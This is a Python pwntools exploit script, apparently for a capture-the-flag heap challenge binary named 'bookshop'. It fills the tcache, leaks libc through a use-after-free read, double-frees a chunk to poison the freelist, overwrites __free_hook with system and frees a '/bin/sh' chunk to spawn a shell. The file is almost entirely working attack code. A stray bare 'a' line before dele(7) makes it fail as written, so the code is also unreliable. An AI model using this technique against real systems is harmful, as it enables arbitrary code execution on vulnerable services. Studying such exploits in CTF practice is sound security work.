#!usr/bin/env python
#-*- coding:utf8 -*-
from pwn import *
import sys

pc="./bookshop"
# reomote_addr=["123.56.122.14",35478]

elf = ELF(pc)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


context.binary=pc
context.terminal=["gnome-terminal",'-x','sh','-c']


if len(sys.argv)==1:
    context.log_level="debug" 
    p=process(pc)
 
if len(sys.argv)==2 :
    if 'r' in sys.argv[1]:
        p = remote(reomote_addr[0],reomote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 

ru = lambda x : p.recvuntil(x,timeout=0.2)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline() 
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
itr= lambda :p.interactive() 
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
og = lambda libcpwd : map(int, subprocess.check_output(['one_gadget', '--raw', libcpwd]).split(' '))



def add(con):
   sla(">> ", "1")
   sla("> ", con)

def dele(idx):
   sla(">> ", "2")
   sla("from you bag?\n", str(idx))

def show(idx):
   sla(">> ", "3")
   sla("want to read?\n", str(idx))

sla("The lucky number?\n", str(0x70))


#0 - 6
for i in range(7):
   add("desh")

add("desh") #7
add("desh") #8
add("desh") #9
add("desh") #10

#0 - 7
for i in range(7):
   dele(i)

a
dele(7)
dele(8)
pause()
sla(">> ", "0" * 0x410)
pause()
show(7)

libc_base = ru7f() - 0x1EBCD0
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg("libc_base")

dele(9)
dele(10)
dele(9)

#11 - 17
for i in range(7):
   add("desh")

add(p64(free_hook)) #18
add("desh") #19
add("/bin/sh\x00") #20
add(p64(system_addr)) #21
dele(20)


src='''
# x/10xg $rebase()
# b *$rebase()
'''
# bp(src)


itr()